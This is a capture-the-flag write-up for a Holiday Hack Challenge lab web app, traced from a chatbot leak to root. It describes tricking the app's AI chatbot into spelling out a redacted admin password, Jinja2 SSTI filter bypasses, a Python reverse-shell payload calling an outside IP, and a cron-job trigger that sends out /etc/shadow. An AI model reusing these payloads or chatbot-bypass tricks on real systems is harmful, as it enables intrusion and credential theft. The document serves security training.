---
layout: default
title: act3_snowblindambush_mjd
nav: |
  |[Previous Objective: Act3 Free Ski](/act3_free_ski_mjd.md)  |   [Table of Contents](/index.md) | [About BerryDunn](/hhc_2025_berrydunn.md) |
  | :----------------------- | :--------------------------------: | --------------------------------: |
---
<table>
<thead>
<tr>
<th>Objective: Snowblind Ambush</th>
<br>
<th>Difficulty Level: 5</th>
</tr>
</thead>
<tbody>
<tr>
<td>Head to the Hotel to stop Frosty's plan. Torkel is waiting at the Grand Web Terminal.</td>
<br>
<td>Location: Grand Hotel</td>
</tr>
</tbody>
</table>

<h2>Solution Overview</h2>

Starting with only public access to the web application, reconnaisance was conducted to identify weaknesses. The chatbot was exploited to recover the admin password to the website. Once logged in, a file upload mechanism was discovered that allowed for abuse. The redirect after file upload used a parameter, that allowed Server Side Template Injection (SSTI). This was exploited to achieve Remote Code Execution (RCE) and access to the application as the www-data identity. A scheduled job was discovered that ran in the context of the root user. Under specific conditions this job would exfiltrate an encrypted copy of the /etc/shadow file. From this file, the password for the root user was obtained. This was used to elevate permissions and obtain the flag.

<table>
<thead>
<tr>
<th>Activity</th>
<br>
<th>Primary Tactic</th>
<br>
<th>MITRE ATT&CK Technique ID</th>
<br>
<th>MITRE ATT&CK Technique Name</th>
</tr>
</thead>
<tbody>
<tr>
<td>Gain Access to web application: Leak Sensitive Information</td>
<br>
<td>Reconnaissance</td>
<br>
<td>T1589</td>
<br>
<td>Gather Victim Identity Information</td>
</tr>
<tr>
<td>Explore SSTI and achieve RCE: Insecure Software</td>
<br>
<td>Execution</td>
<br>
<td>T1190</td>
<br>
<td>Exploit Public-Facing Application</td>
</tr>
<tr>
<td>Achieve Shell Access: Insecure File Upload	Resource</td>
<br>
<td>Development</td>
<br>
<td>T1608.001</td>
<br>
<td>Upload Malware</td>
</tr>
<tr>
<td>Exfiltrate Data</td>
<br>
<td>Exfiltration</td>
<br>
<td>T1041</td>
<br>
<td>Exfiltration Over C2 Channel</td>
</tr>
<tr>
<td>Decode PNG file</td>
<br>
<td>Defense Evasion</td>
<br>
<td>T1140</td>
<br>
<td>Deobfuscate/Decode Files or Information</td>
</tr>
<tr>
<td>Crack hashed password for Root</td>
<br>
<td>Credential Access</td>
<br>
<td>T1110.002</td>
<br>
<td>Password Cracking</td>
</tr>
<tr>
<td>Escalate Privileges</td>
<br>
<td>Privilege Escalation</td>
<br>
<td>T1548</td>
<br>
<td>Abuse Elevation Control Mechanism</td>
</tr>
</tbody>
</table>

<h2>Detailed Solution</h2>
<details>
<summary>Click to expand</summary>

<h2>Step One: Gain Access to web application by abusing Chatbot</h2>

Initial discovery activities of the website uncovered the following:

<ul>
<li>The landing page code included a javascript file that was not actually loaded, egg.js</li>
</ul>

    <img src="/images/snowblind_egg.js.jpg" alt="Landing Page Code">

<ul>
<li>Reviewing the code gives a hint: "AI Gnomes do not know the difference between left and right"</li>
</ul>

    <img src="/images/snowblind_egghint.jpg" alt="Chatbot Script Hint">

<ul>
<li>AI chatbot gives redacted and conflicting hints about the password for the application login</li>
</ul>

   Conversations with the chatbot revealed that it had information about the application admin account in the form of hints. Some of the hints are conflicting, making them unreliable. The chatbot redacts phrases, so it knows the password. The chatbot reveals the information when prompted to spell the password one character per line, defeating the redaction mechanisms. The password works for login, and additional functionality is available to explore. The left and right hint works as well. The chatbot will spell the password in reverse order without redactions.

   <strong>admin password: an_elf_and_password_on_a_bird</strong>

<img src="/images/snowblind_adminpassword.jpg" alt="Admin Password">


<ul>
<li>File upload mechanism</li>
</ul>
    The profile page contains a file upload mechanism. While the page indicates only allowed filetypes, it is possible to upload a file that contains script code. Upon upload, the file is renamed to admin_XXXXXXXXXXXXXXXX.png, with the placeholder changing with every upload. This is a way to get a payload into the application, but not a way to trigger it.

    <img src="/images/snowblind_fileupload.jpg" alt="File Upload">

<ul>
<li>Parameter used after file upload</li>
</ul>
  After upload the page redirects and uses a parameter username.

      <img src="/images/snowblind_parameter.jpg" alt="Redirect Parameter">

<h2>Step Two: Explore SSTI and achieve RCE : Insecure Software</h2>
<br>
The hint indicates that the application is using Flask. There are two helpful resources for understanding SSTI:

<a href="https://onsecurity.io/article/server-side-template-injection-with-jinja2/">Server Side Template Injections with Jinja2</a>

<a href="https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/Python/#summary">Server Side Template Injection - Python - Payloads All The Things</a>

A basic test to see if SSTI is possible is {{7*7}}. Because the application evaluates the expression and displays the results on the page, the application is likely vulnerable.

<img src="/images/snowblind_sstitest.jpg" alt="SSTI Test">

Trial and error testing revealed the following filters and the obfuscations needed to bypass.
<br>
<pre><code class="language-">
<br>
┌───────────────────────────────┐
<br>
│ 1. Payload Construction        │
<br>
│   - Bracket access             │
<br>
│   - Escaped underscores (\u005f, \137)
<br>
│   - Reversed strings ('ssalc'|reverse) │
<br>
└───────────────┬───────────────┘
<br>
                │
<br>
                ▼
<br>
┌───────────────────────────────┐
<br>
│ 2. WAF Bypass                 │
<br>
│   - Literal "_" stripped       │
<br>
│   - Escapes reconstruct "_"    │
<br>
│   - Reverse evades keyword ban │
<br>
└───────────────┬───────────────┘
<br>
                │
<br>
                ▼
<br>
┌───────────────────────────────┐
<br>
│ 3. Dunder Reconstruction      │
<br>
│   - __class__ rebuilt          │
<br>
│   - __mro__ rebuilt            │
<br>
└───────────────┬───────────────┘
<br>
                │
<br>
                ▼
<br>
┌───────────────────────────────┐
<br>
│ 4. Traversal into Internals   │
<br>
│   - attr('__subclasses__')()  │
<br>
│   - Returns real class list    │
<br>
└───────────────┬───────────────┘
<br>
                │
<br>
                ▼
<br>
┌───────────────────────────────┐
<br>
│ 5. Subclass Enumeration       │
<br>
│   - collections.OrderedDict    │
<br>
│   - enum._EnumDict             │
<br>
│   - werkzeug.datastructures... │
<br>
│   - flask.config.Config        │
<br>
│   ...                          │
<br>
└───────────────┬───────────────┘
<br>
                │
<br>
                ▼
<br>
┌───────────────────────────────┐
<br>
│ 6. Patched Routes             │
<br>
│   - object.__subclasses__() → 500
<br>
│   - mro()[0].__subclasses__() → 500
<br>
│   → Sandbox hardening present  │
<br>
└───────────────────────────────┘
<br>
</code></pre>
<br>
A script was used to enumerate the indexes and evaluate if RCE is possible. The initial command used was a simple 'whoami".

The enumeration script source code is located here: <a href="/resources/snowblind_enumeration2.py.txt">Jinja2 SSTI Enumeration Script</a>

<img src="/images/snowblind_enumeration1.jpg" alt="SSTI Enumeration">

The following indexes where discovered that would allow RCE:

<img src="/images/snowblind_enumeration2.jpg" alt="SSTI Enumeration">

<h2>Step Three: Achieve Shell Access Utilizing Insecure File Upload</h2>

The following payload was inserted into a file called payload.jpg and uploaded to the admin profile.

<pre><code class="language-">
<br>
#!/bin/sh
<br>
export RHOST="45.79.190.29";export RPORT=4444;python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
<br>
</code></pre>

Selecting index 205 with get > os > popen.read() as our target, the following command was executed, resulting in a shell running in the www-data context.

<pre><code class="language-">
<br>
sh /app/static/images/admin\\u005ff1f9cc53781abb79\\u002epng
<br>
</code></pre>

<h2>Step Four: Exfilitrate Data leveraging an Insecure processes / Data Leakage</h2>

With initial access established, time for more recon. An interesting cron job was located in /etc/cron/cron.d/mycron. It runs a backup script every minute as root.

<img src="/images/snowblind_cronjob.jpg" alt="Cron Job">

The script does the following:
<ul>
<li>it looks for a file in /dev/shm with a name formatted according to this pattern: '\\.frosty[0-9]+$'</li>
<br>
<li>it reads the file and applies a regular expression that requires at least the final two characters of the url to be letters and not numbers</li>
<br>
<li>if the regular experssion is true, it encrypts a copy of /etc/shadow and posts it to the url</li>
</ul>

<img src="/images/snowblind_regex.jpg" alt="URL Regex">

A copy of the backup script is located here: <a href="/resources/snowblind_backup.py.txt">Backup Script</a>

An HTTP server was started on an external facing linux server on port 8000 to receive the data being exfitrated.

The following command was issued in the shell as www-data to trigger the data exfiltration. The file was created, and moments later it was deposited on my web server.

<pre><code class="language-">
<br>
echo "http://45-79-190-29.ip.linodeusercontent.com:8000/exfil" > /dev/shm/.frosty999
<br>
</code></pre>

The exfiltrated data file is located here: <a href="/resources/shadow_exfil.png">Exfiltrated File</a>

<h2>Step Five:  Decode PNG file</h2>

Since we have the backup script, we know the encryption mechanism. We also know what the first block of data encrypted is "root:$". With this information, we can decode the file.

Using this script to decode: <a href="/resources/snowblind_decodepng3.py.txt">PNG Decoder Script</a>

The file was damaged or incomplete, so the script suppresses errors and forces the data to be extracted. The backup script indicates that the data is exfiltrated is stored in the Blue channel of the file. The other channels can be ignored. Running the script reveals the exfiltrated data stored in the file.

<img src="/images/snowblind_decodedpng.jpg" alt="Decoded PNG File">

<h2>Step Six: Crack Hash for Root</h2>

With the password hash, salt, and the algorithm used, we can attempt to crack the hash using John the Ripper and the rockyou word list.

<img src="/images/snowblind_johntheripper.jpg" alt="John the Ripper">

<strong>root password: jollyboy</strong>

<h2>Step Seven: Escalate privileges</h2>

With root password, it is a simple matter to escalate privileges using the su command. Once root, there is a bash script in the /root directory. Executing the script reveals the flag.

<img src="/images/snowblind_privilegeescalation.jpg" alt="Privilege Escalation">


<strong>Answer: hhc25{Frostify_The_World_c05730b46d0f30c9d068343e9d036f80}</strong>

</details>

<h2>Tools Reference</h2>

<table>
<thead>
<tr>
<th>Tools Used</th>
<br>
<th>Tool Version</th>
</tr>
</thead>
<tbody>
<tr>
<td>John the Ripper</td>
<br>
<td>1.9.0-jumbo-1+bleeding-aec1328d6c</td>
</tr>
<tr>
<td>Linux Linode</td>
<br>
<td>System	Ubuntu 24.04 LTS</td>
</tr>
<tr>
<td>netcat</td>
<br>
<td>v1.10-50</td>
</tr>
<tr>
<td>Edge Developer Tools</td>
<br>
<td>Version 142.0.3595.94</td>
</tr>
<tr>
<td>Burp Suite Community Edition</td>
<br>
<td>v2024.11.2</td>
</tr>
</tbody>
</table>

<h2>Hints Reference</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<br>
<th>Hint</th>
</tr>
</thead>
<tbody>
<tr>
<td>Santa</td>
<br>
<td>Codes: If you can't get your payload to work, perhaps you are missing some form of obfuscation? A computer can understand many languages and formats, find one that works! Don't give up until you have tried at least eight different ones, if not, then it's truely hopeless.</td>
</tr>
<tr>
<td>Santa</td>
<br>
<td>Overtly Helpful?: I think admin is having trouble, remembering his password. I wonder how he is retaining access, I'm sure someone or something is helping him remembering. Ask around!</td>
</tr>
<tr>
<td>Torkel</td>
<br>
<td>I've been studying this web application that controls part of Frosty's infrastructure. There's a Flask backend with an AI chatbot that seems to have access to sensitive system information. Think of this as finding a way up the skorstein into Frosty's system - we need to exploit this chatbot to gain access and ultimately stop Frosty from freezing everything. Can you help me get through these defenses?</td>
</tr>
</tbody>
</table>
<h2>Acknowledgements</h2>
<table>
<thead>
<tr>
<th>Provided By</th>
<br>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>Fluffme</td>
<br>
<td>My initial "shell" was more of a SSTI command pipeline. This was not the right approach.</td>
</tr>
<tr>
<td>Khesperus</td>
<br>
<td>Sanity checks on achieving shell and on decrypting the png file.</td>
</tr>
</tbody>
</table>